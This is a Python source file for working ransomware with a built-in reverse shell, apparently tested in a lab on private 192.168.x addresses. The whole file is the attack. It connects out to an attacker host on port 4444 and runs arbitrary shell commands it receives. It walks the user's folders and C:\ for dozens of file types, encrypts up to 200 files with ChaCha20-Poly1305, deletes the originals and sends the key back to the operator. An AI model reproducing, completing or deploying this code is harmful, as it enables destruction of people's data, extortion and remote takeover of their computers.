#!/usr/bin/env python3
"""
SIMPLE MODERN VICTIM - FIXED TXT AND DECRYPTION
"""
import socket
import subprocess
import os
import sys
import time
import base64
import secrets
import struct
import traceback
import stat
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend

try:
    from victim_keys import PUBLIC_KEYS, SALT
except ImportError:
    print("[-] ERROR: victim_keys.py not found!")
    print("[*] Generate keys first: python key.py")
    sys.exit(1)

class SimpleModernVictim:
    def __init__(self, attacker_ip='192.168.174.128', attacker_port=4444):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.socket = None
        self.running = False
        self.session_key = None
        
        self.load_keys()
        
        # COMPREHENSIVE TARGET EXTENSIONS (INCLUDING .txt) - FIXED ORDER
        self.target_extensions = [
            # Documents - TXT FIRST
            '.txt', '.doc', '.docx', '.pdf', '.rtf', '.odt',
            '.xls', '.xlsx', '.csv', '.ods',
            '.ppt', '.pptx', '.odp',
            
            # Images
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif',
            '.svg', '.ico', '.psd', '.ai', '.eps',
            
            # Media
            '.mp3', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
            '.wav', '.aac', '.flac', '.m4a', '.ogg',
            
            # Archives
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
            
            # Code
            '.py', '.java', '.cpp', '.c', '.cs', '.js', '.html', '.htm',
            '.css', '.php', '.rb', '.go', '.rs', '.swift',
            '.xml', '.json', '.yml', '.yaml',
            
            # Database
            '.db', '.sqlite', '.mdb', '.accdb',
            
            # Other important
            '.ini', '.cfg', '.conf', '.config',
            '.log', '.bak', '.tmp',
        ]
        
        self.excluded_dirs = [
            'C:\\Windows\\',
            'C:\\Program Files\\',
            'C:\\Program Files (x86)\\',
            'C:\\$Recycle.Bin\\',
            os.path.dirname(os.path.abspath(__file__)) + '\\',
        ]
        
        print(f"[+] Simple Modern Victim initialized")
        print(f"[+] Target extensions loaded: {len(self.target_extensions)}")
        print(f"[+] TXT in extensions: {'.txt' in self.target_extensions}")
    
    def load_keys(self):
        """Load embedded keys"""
        try:
            rsa_public_pem = base64.b64decode(PUBLIC_KEYS['rsa_public'])
            ecc_public_pem = base64.b64decode(PUBLIC_KEYS['ecc_public'])
            
            self.rsa_public_key = serialization.load_pem_public_key(
                rsa_public_pem,
                backend=default_backend()
            )
            
            self.ecc_public_key = serialization.load_pem_public_key(
                ecc_public_pem,
                backend=default_backend()
            )
            
            self.key_id = PUBLIC_KEYS['id']
            self.salt = base64.b64decode(SALT)
            
        except Exception as e:
            print(f"[-] Failed to load keys: {e}")
            sys.exit(1)
    
    def send_data(self, data):
        """Send data"""
        if not self.socket:
            return False
        try:
            self.socket.send(data)
            return True
        except Exception as e:
            print(f"[-] Send error: {e}")
            return False
    
    def receive_data(self, timeout=30):
        """Receive data with simple timeout handling"""
        if not self.socket:
            return None
        try:
            self.socket.settimeout(timeout)
            data = self.socket.recv(4096)
            self.socket.settimeout(None)
            return data
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[-] Receive error: {e}")
            return None
    
    def connect(self):
        """Connect to attacker"""
        print("\n" + "=" * 60)
        print("SIMPLE MODERN VICTIM - FIXED TXT & DECRYPTION")
        print("=" * 60)
        print(f"[*] Victim IP: 192.168.174.129")
        print(f"[*] Attacker: {self.attacker_ip}:{self.attacker_port}")
        print(f"[*] Key ID: {self.key_id}")
        print(f"[*] Target Extensions: {len(self.target_extensions)} types")
        print(f"[*] First 5 extensions: {self.target_extensions[:5]}")
        print("[*] Connecting...")

        attempt = 1
        max_attempts = 5

        while attempt <= max_attempts and not self.running:
            print(f"\n[*] Attempt {attempt}/{max_attempts}")

            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(15)
                print(f"[*] Connecting to {self.attacker_ip}:{self.attacker_port}...")
                self.socket.connect((self.attacker_ip, self.attacker_port))
                self.socket.settimeout(30)
                self.running = True

                print(f"[+] CONNECTION ESTABLISHED!")
                print(f"[+] Time: {time.ctime()}")

                welcome = self.socket.recv(4096).decode('ascii', errors='ignore')
                print(welcome)
                
                # Wait for READY signal
                ready_signal = self.socket.recv(1024).decode()
                if ready_signal == "READY":
                    print("[+] Received READY signal from attacker")
                    self.socket.send(b"VICTIM_READY")
                
                # Start command handler
                self.command_handler()

            except Exception as e:
                print(f"[-] Connection error: {e}")
                traceback.print_exc()
                if self.socket:
                    self.socket.close()
                    self.socket = None

            if not self.running and attempt < max_attempts:
                print(f"[*] Retrying in 3 seconds...")
                time.sleep(3)
                attempt += 1

        if not self.running:
            print("\n[-] Failed to connect")
        return self.running
    
    def command_handler(self):
        """Main command handler with improved parsing"""
        print("\n[+] Ready for commands...")

        while self.running:
            try:
                command_data = self.receive_data(timeout=10)
                if not command_data:
                    print("[-] Connection lost or timeout")
                    continue

                command = command_data.decode('utf-8', errors='ignore').strip()
                
                if not command:
                    continue
                
                print(f"[*] Received command: {command}")
                
                # Handle exit command
                if command.lower() == "exit":
                    print("[*] Exit command received")
                    self.socket.send(b"[+] Session terminated\nEND_OF_OUTPUT")
                    break
                
                # Handle scan command
                if command.lower() == "scan":
                    self.handle_scan()
                    continue
                
                # Handle status command
                if command.lower() == "status":
                    self.handle_status()
                    continue
                
                # Handle encryption commands
                if command.lower().startswith("encrypt ") or command.lower() == "encrypt":
                    if command.lower() == "encrypt":
                        # Default to all if no target specified
                        target = "all"
                    else:
                        target = command.lower().replace("encrypt ", "").strip()
                    
                    if not target:
                        target = "all"
                    
                    print(f"[+] Starting encryption for target: {target}")
                    self.handle_encryption(target)
                    continue
                
                # Handle decrypt command
                if command.lower() == "decrypt":
                    print("[+] Starting decryption...")
                    self.handle_decryption()
                    continue
                
                # Handle setkey command
                if command.lower().startswith("setkey "):
                    parts = command.split(" ", 1)
                    if len(parts) == 2:
                        try:
                            new_key = bytes.fromhex(parts[1])
                            if len(new_key) == 32:
                                self.session_key = new_key
                                response = f"[+] Key updated: {self.session_key.hex()[:16]}...\nEND_OF_OUTPUT"
                                self.socket.send(response.encode())
                            else:
                                self.socket.send(b"[-] Key must be 64 hex chars (32 bytes)\nEND_OF_OUTPUT")
                        except:
                            self.socket.send(b"[-] Invalid hex key\nEND_OF_OUTPUT")
                    continue
                
                # Handle key command
                if command.lower() == "key":
                    key_info = f"[+] Current key: {self.session_key.hex() if self.session_key else 'None'}\nEND_OF_OUTPUT"
                    self.socket.send(key_info.encode())
                    continue
                
                # Execute shell command (like ipconfig, whoami, etc.)
                output = self.execute_command(command)
                self.socket.send(output + b"\nEND_OF_OUTPUT")

            except KeyboardInterrupt:
                print("\n[*] Keyboard interrupt")
                break
            except Exception as e:
                print(f"[-] Command handler error: {e}")
                traceback.print_exc()
                error_msg = f"[-] Error: {str(e)}\nEND_OF_OUTPUT"
                if self.socket:
                    try:
                        self.socket.send(error_msg.encode())
                    except:
                        pass
                break

        self.cleanup()
    
    def handle_encryption(self, target):
        """Handle encryption with comprehensive targeting"""
        try:
            print(f"[+] Starting encryption for: {target}")
            
            target_files = self.find_target_files(target)
            
            if not target_files:
                response = "[+] No target files found\nEND_OF_OUTPUT"
                self.socket.send(response.encode())
                return
            
            # Generate session key if not exists - MUST DO THIS BEFORE ENCRYPTION
            if not self.session_key:
                self.session_key = secrets.token_bytes(32)
                print(f"[+] Generated NEW session key for encryption: {self.session_key.hex()[:16]}...")
            
            response = f"""
[+] ENCRYPTION INITIATED
    =============================================
    [+] Target: {target}
    [+] Files Found: {len(target_files):,}
    [+] Processing: {min(200, len(target_files))} files
    [+] Key: {self.session_key.hex()[:16]}...
    [+] Target Extensions: {len(self.target_extensions)}
    [+] Time: {time.ctime()}
    =============================================
    
[+] Starting encryption...
END_OF_OUTPUT"""
            self.socket.send(response.encode())
            
            encrypted_count = 0
            failed_count = 0
            files_to_process = target_files[:200]  # Limit to 200 files
            
            # DEBUG: Show first few files
            print(f"[DEBUG] First 5 files to process:")
            for i, f in enumerate(files_to_process[:5]):
                print(f"  {i+1}. {os.path.basename(f)} ({os.path.getsize(f) if os.path.exists(f) else 'N/A'} bytes)")
            
            for i, filepath in enumerate(files_to_process, 1):
                try:
                    if i % 5 == 0:
                        print(f"  [+] Processing {i}/{len(files_to_process)}: {os.path.basename(filepath)[:30]}...")
                    
                    if self.encrypt_file(filepath):
                        encrypted_count += 1
                    else:
                        failed_count += 1
                    
                    # Send progress every 10 files
                    if i % 10 == 0:
                        progress = f"[+] Progress: {i}/{len(files_to_process)}, Encrypted: {encrypted_count}, Failed: {failed_count}\n"
                        self.socket.send(progress.encode())
                        
                except Exception as e:
                    print(f"[-] Error processing {filepath}: {e}")
                    failed_count += 1
                    continue
            
            final_report = f"""
[+] ENCRYPTION COMPLETE
    =============================================
    [+] Target: {target}
    [+] Files Processed: {len(files_to_process)}
    [+] Successfully Encrypted: {encrypted_count}
    [+] Failed: {failed_count}
    [+] Success Rate: {(encrypted_count/len(files_to_process)*100):.1f}%
    [+] Time: {time.ctime()}
    [+] Session Key: {self.session_key.hex()[:16]}...
    =============================================
    
[+] {'ENCRYPTION SUCCESSFUL' if encrypted_count > 0 else 'ENCRYPTION FAILED'}
[+] IMPORTANT: Save this key for decryption!
[+] Key: {self.session_key.hex()}
END_OF_OUTPUT"""
            
            self.socket.send(final_report.encode())
            print(f"[+] Encryption complete. Session key: {self.session_key.hex()}")
            
        except Exception as e:
            print(f"[-] Encryption error: {e}")
            traceback.print_exc()
            error_msg = f"[-] Encryption error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())
    
    def encrypt_file(self, filepath):
        """Encrypt file"""
        try:
            if not os.path.exists(filepath):
                print(f"  [!] File not found: {filepath}")
                return False
            
            # Check file size
            try:
                file_size = os.path.getsize(filepath)
                if file_size == 0:
                    print(f"  [!] Skipping empty file: {filepath}")
                    return False
                if file_size > 100 * 1024 * 1024:  # Skip >100MB files
                    print(f"  [!] Skipping large file ({file_size} bytes): {filepath}")
                    return False
            except Exception as e:
                print(f"  [!] Error getting file size for {filepath}: {e}")
                return False
            
            # Ensure we have a session key
            if not self.session_key:
                print("  [!] No session key available!")
                return False
            
            # Read file
            try:
                with open(filepath, 'rb') as f:
                    plaintext = f.read()
            except Exception as e:
                print(f"  [!] Error reading file {filepath}: {e}")
                return False
            
            # Debug: Check file content
            ext = os.path.splitext(filepath)[1].lower()
            if ext == '.txt':
                print(f"  [DEBUG] Encrypting TXT file: {filepath}, Size: {len(plaintext)} bytes")
            
            # Encrypt
            try:
                chacha = ChaCha20Poly1305(self.session_key)
                nonce = secrets.token_bytes(12)
                ciphertext = chacha.encrypt(nonce, plaintext, None)
            except Exception as e:
                print(f"  [!] Encryption error for {filepath}: {e}")
                return False
            
            # Save encrypted file
            encrypted_path = filepath + '.encrypted'
            try:
                with open(encrypted_path, 'wb') as f:
                    f.write(nonce)
                    f.write(ciphertext)
            except Exception as e:
                print(f"  [!] Error saving encrypted file {encrypted_path}: {e}")
                return False
            
            # Verify encryption
            if os.path.exists(encrypted_path) and os.path.getsize(encrypted_path) > 0:
                # Delete original if encryption succeeded
                try:
                    os.remove(filepath)
                    if ext == '.txt':
                        print(f"  [SUCCESS] Encrypted and deleted TXT file: {filepath}")
                    return True
                except Exception as e:
                    print(f"  [!] Error deleting original file {filepath}: {e}")
                    # File encrypted but original couldn't be deleted
                    return True
            
            return False
            
        except Exception as e:
            print(f"  [!] General error encrypting {filepath}: {e}")
            traceback.print_exc()
            return False
    
    def handle_decryption(self):
        """Handle decryption - FIXED VERSION"""
        try:
            print("[+] Starting decryption...")
            
            encrypted_files = self.find_encrypted_files()
            
            if not encrypted_files:
                response = "[+] No encrypted files found\nEND_OF_OUTPUT"
                self.socket.send(response.encode())
                return
            
            # Check if we have a session key
            if not self.session_key:
                response = """
[+] DECRYPTION FAILED
    =============================================
    [+] Error: No session key available
    [+] Encrypted Files Found: {len(encrypted_files):,}
    [+] Time: {time.ctime()}
    =============================================
    
[+] SOLUTION:
    • Use 'setkey <hex>' to provide the encryption key
    • The key is 64 hex characters (32 bytes)
    • Example: setkey 00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff
    
END_OF_OUTPUT"""
                self.socket.send(response.encode())
                return
            
            response = f"""
[+] DECRYPTION INITIATED
    =============================================
    [+] Encrypted Files Found: {len(encrypted_files):,}
    [+] Key: {self.session_key.hex()[:16]}...
    [+] Time: {time.ctime()}
    =============================================
    
[+] Starting decryption...
END_OF_OUTPUT"""
            self.socket.send(response.encode())
            
            decrypted_count = 0
            failed_count = 0
            
            for i, filepath in enumerate(encrypted_files, 1):
                try:
                    if i % 5 == 0:
                        print(f"  [+] Processing {i}/{len(encrypted_files)}: {os.path.basename(filepath)[:30]}...")
                    
                    if self.decrypt_file(filepath):
                        decrypted_count += 1
                    else:
                        failed_count += 1
                    
                    if i % 10 == 0:
                        progress = f"[+] Progress: {i}/{len(encrypted_files)}, Decrypted: {decrypted_count}, Failed: {failed_count}\n"
                        self.socket.send(progress.encode())
                        
                except Exception as e:
                    print(f"[-] Error decrypting {filepath}: {e}")
                    failed_count += 1
                    continue
            
            final_report = f"""
[+] DECRYPTION COMPLETE
    =============================================
    [+] Files Processed: {len(encrypted_files)}
    [+] Successfully Decrypted: {decrypted_count}
    [+] Failed: {failed_count}
    [+] Success Rate: {(decrypted_count/len(encrypted_files)*100):.1f}%
    [+] Time: {time.ctime()}
    [+] Key Used: {self.session_key.hex()[:16]}...
    =============================================
    
[+] {'DECRYPTION SUCCESSFUL' if decrypted_count > 0 else 'DECRYPTION FAILED'}
END_OF_OUTPUT"""
            
            self.socket.send(final_report.encode())
            print(f"[+] Decryption complete. Success: {decrypted_count}/{len(encrypted_files)}")
            
        except Exception as e:
            print(f"[-] Decryption error: {e}")
            traceback.print_exc()
            error_msg = f"[-] Decryption error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())
    
    def decrypt_file(self, filepath):
        """Decrypt file"""
        try:
            if not os.path.exists(filepath):
                return False
            
            if not self.session_key:
                print(f"  [!] No session key for decryption")
                return False
            
            # Read encrypted file
            with open(filepath, 'rb') as f:
                nonce = f.read(12)
                ciphertext = f.read()
            
            # Decrypt
            chacha = ChaCha20Poly1305(self.session_key)
            plaintext = chacha.decrypt(nonce, ciphertext, None)
            
            # Restore original filename
            original_path = filepath.replace('.encrypted', '')
            with open(original_path, 'wb') as f:
                f.write(plaintext)
            
            # Remove encrypted file
            os.remove(filepath)
            
            print(f"  [SUCCESS] Decrypted: {os.path.basename(filepath)}")
            return True
            
        except Exception as e:
            print(f"  [!] Failed to decrypt {filepath}: {e}")
            return False
    
    def find_target_files(self, target):
        """Find target files with comprehensive search - FIXED"""
        target_files = []
        scan_dirs = []
        
        target = target.lower()
        
        if target == 'system':
            drives = ['C:\\', 'D:\\', 'E:\\'] if os.name == 'nt' else ['/']
            for drive in drives:
                if os.path.exists(drive):
                    scan_dirs.append(drive)
        
        elif target == 'documents':
            scan_dirs = [os.path.expanduser('~\\Documents')]
        
        elif target == 'desktop':
            scan_dirs = [os.path.expanduser('~\\Desktop')]
        
        elif target == 'downloads':
            scan_dirs = [os.path.expanduser('~\\Downloads')]
        
        elif target == 'pictures':
            scan_dirs = [os.path.expanduser('~\\Pictures')]
        
        elif target == 'music':
            scan_dirs = [os.path.expanduser('~\\Music')]
        
        elif target == 'videos':
            scan_dirs = [os.path.expanduser('~\\Videos')]
        
        elif target == 'all':
            scan_dirs = [
                os.path.expanduser('~\\Documents'),
                os.path.expanduser('~\\Desktop'),
                os.path.expanduser('~\\Downloads'),
                os.path.expanduser('~\\Pictures'),
                os.path.expanduser('~\\Music'),
                os.path.expanduser('~\\Videos'),
                os.path.expanduser('~\\OneDrive'),
                'C:\\'
            ]
        
        else:
            scan_dirs = [target]
        
        print(f"[+] Scanning directories for target '{target}':")
        
        for scan_dir in scan_dirs:
            if not os.path.exists(scan_dir):
                print(f"  [!] Directory not found: {scan_dir}")
                continue
                
            print(f"  [+] Scanning: {scan_dir}")
            
            try:
                file_count = 0
                txt_count = 0
                for root, dirs, files in os.walk(scan_dir):
                    # Skip excluded directories
                    skip_this_branch = False
                    for excluded in self.excluded_dirs:
                        if root.lower().startswith(excluded.lower()):
                            dirs[:] = []
                            skip_this_branch = True
                            break
                    
                    if skip_this_branch:
                        continue
                    
                    # Skip hidden/system directories
                    dirs[:] = [d for d in dirs if not d.startswith('.') and not d.startswith('$')]
                    
                    for filename in files:
                        filepath = os.path.join(root, filename)
                        
                        # Skip already encrypted files
                        if filename.endswith('.encrypted'):
                            continue
                        
                        # Skip hidden/system files
                        if filename.startswith('.') or filename.startswith('~$'):
                            continue
                        
                        # Check extension
                        _, ext = os.path.splitext(filename)
                        ext_lower = ext.lower()
                        
                        # DEBUG: Track TXT files
                        if ext_lower == '.txt':
                            txt_count += 1
                            print(f"    [TXT #{txt_count}] Found: {filepath}")
                        
                        if ext_lower in self.target_extensions:
                            try:
                                size = os.path.getsize(filepath)
                                if 100 <= size <= 100 * 1024 * 1024:  # 100 bytes to 100MB
                                    target_files.append(filepath)
                                    file_count += 1
                            except:
                                continue
                
                print(f"  [+] Found {file_count} target files in {scan_dir} (including {txt_count} TXT files)")
                
            except Exception as e:
                print(f"  [!] Error scanning {scan_dir}: {e}")
                continue
        
        print(f"[+] Total found {len(target_files)} target files for '{target}'")
        
        # Debug: List first few files by type
        txt_files = [f for f in target_files if f.lower().endswith('.txt')]
        py_files = [f for f in target_files if f.lower().endswith('.py')]
        
        print(f"[DEBUG] TXT files found: {len(txt_files)}")
        if txt_files:
            for i, f in enumerate(txt_files[:3]):
                print(f"  TXT {i+1}: {os.path.basename(f)}")
        
        print(f"[DEBUG] PY files found: {len(py_files)}")
        if py_files:
            for i, f in enumerate(py_files[:3]):
                print(f"  PY {i+1}: {os.path.basename(f)}")
        
        return target_files
    
    def find_encrypted_files(self):
        """Find encrypted files"""
        encrypted_files = []
        search_dirs = [
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Music'),
            os.path.expanduser('~\\Videos'),
            'C:\\',
        ]
        
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue
                
            try:
                count = 0
                for root, dirs, files in os.walk(search_dir):
                    for filename in files:
                        if filename.endswith('.encrypted'):
                            encrypted_files.append(os.path.join(root, filename))
                            count += 1
                if count > 0:
                    print(f"  [+] Found {count} encrypted files in {search_dir}")
            except:
                continue
        
        print(f"[+] Total encrypted files found: {len(encrypted_files)}")
        return encrypted_files
    
    def handle_scan(self):
        """Handle scan command"""
        try:
            total_files = 0
            encrypted_count = 0
            txt_files = 0
            
            scan_dirs = [
                os.path.expanduser('~\\Desktop'),
                os.path.expanduser('~\\Documents'),
                os.path.expanduser('~\\Downloads'),
                os.path.expanduser('~\\Pictures'),
            ]
            
            for scan_dir in scan_dirs:
                if not os.path.exists(scan_dir):
                    continue
                    
                try:
                    for root, dirs, files in os.walk(scan_dir):
                        for filename in files:
                            if filename.endswith('.encrypted'):
                                encrypted_count += 1
                            else:
                                _, ext = os.path.splitext(filename)
                                ext_lower = ext.lower()
                                if ext_lower in self.target_extensions:
                                    try:
                                        filepath = os.path.join(root, filename)
                                        size = os.path.getsize(filepath)
                                        if 100 <= size <= 100 * 1024 * 1024:
                                            total_files += 1
                                            if ext_lower == '.txt':
                                                txt_files += 1
                                    except:
                                        pass
                except:
                    continue
            
            report = f"""
[+] COMPREHENSIVE SYSTEM SCAN
    =============================================
    [+] Scan Time: {time.ctime()}
    [+] Key ID: {self.key_id}
    [+] Target Extensions: {len(self.target_extensions)}
    [+] Target Files Found: {total_files:,}
    [+] TXT Files: {txt_files:,}
    [+] Already Encrypted: {encrypted_count:,}
    [+] Encryption Coverage: {(encrypted_count/(total_files + encrypted_count)*100 if (total_files + encrypted_count) > 0 else 0):.1f}%
    =============================================
    
[+] AVAILABLE TARGETS:
    • all        - All user files + system
    • system     - System-wide files
    • documents  - Documents folder
    • desktop    - Desktop files
    • downloads  - Downloads folder
    • pictures   - Pictures folder
    • music      - Music folder
    • videos     - Videos folder
    
END_OF_OUTPUT"""
            
            self.socket.send(report.encode())
            
        except Exception as e:
            error_msg = f"[-] Scan error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())
    
    def handle_status(self):
        """Handle status command"""
        try:
            # Count encrypted files
            encrypted_count = len(self.find_encrypted_files())
            
            # Show current key status
            key_status = "NOT SET (will be auto-generated on encryption)"
            if self.session_key:
                key_status = f"SET: {self.session_key.hex()[:16]}..."
            
            status = f"""
[+] SYSTEM STATUS REPORT
    =============================================
    [+] Hostname: {socket.gethostname()}
    [+] User: {os.getlogin() if hasattr(os, 'getlogin') else 'SYSTEM'}
    [+] Key ID: {self.key_id}
    [+] Session Key: {key_status}
    [+] Encrypted Files: {encrypted_count:,}
    [+] Target Extensions: {len(self.target_extensions)} (.txt is included)
    [+] Time: {time.ctime()}
    =============================================
    
[+] ENCRYPTION/DECRYPTION STATUS:
    • For encryption: Key will be auto-generated
    • For decryption: Use 'setkey <hex>' to provide key
    • Current key: {self.session_key.hex() if self.session_key else 'None'}
    
[+] AVAILABLE COMMANDS:
    • encrypt all/system/documents/desktop/downloads/pictures/music/videos
    • decrypt (requires key via 'setkey' first)
    • setkey <64_hex_chars> - Set decryption key
    • key - Show current key
    • scan
    • status
    
END_OF_OUTPUT"""
            
            self.socket.send(status.encode())
            
        except Exception as e:
            error_msg = f"[-] Status error: {str(e)}\nEND_OF_OUTPUT"
            self.socket.send(error_msg.encode())
    
    def execute_command(self, command):
        """Execute shell command"""
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )

            stdout, stderr = process.communicate(timeout=30)
            
            output = ""
            if stdout:
                output += stdout
            if stderr:
                if output:
                    output += "\n"
                output += "[ERROR]\n" + stderr
            
            if not output:
                output = f"[+] Command '{command}' executed successfully\n"

            return output.encode()

        except subprocess.TimeoutExpired:
            process.kill()
            return b"[-] Timeout (30 seconds)\n"
        except Exception as e:
            return f"[-] Error: {str(e)}\n".encode()
    
    def cleanup(self):
        """Cleanup"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[*] Victim stopped")

def main():
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        print("[+] Cryptography library: OK")
    except ImportError:
        print("[-] ERROR: Install cryptography!")
        print("[*] Run: pip install cryptography")
        sys.exit(1)
    
    try:
        ATTACKER_IP = "192.168.174.128"
        ATTACKER_PORT = 4444

        victim = SimpleModernVictim(
            attacker_ip=ATTACKER_IP,
            attacker_port=ATTACKER_PORT
        )
        victim.connect()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {e}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    print("[+] SIMPLE MODERN VICTIM - FIXED TXT & DECRYPTION")
    main()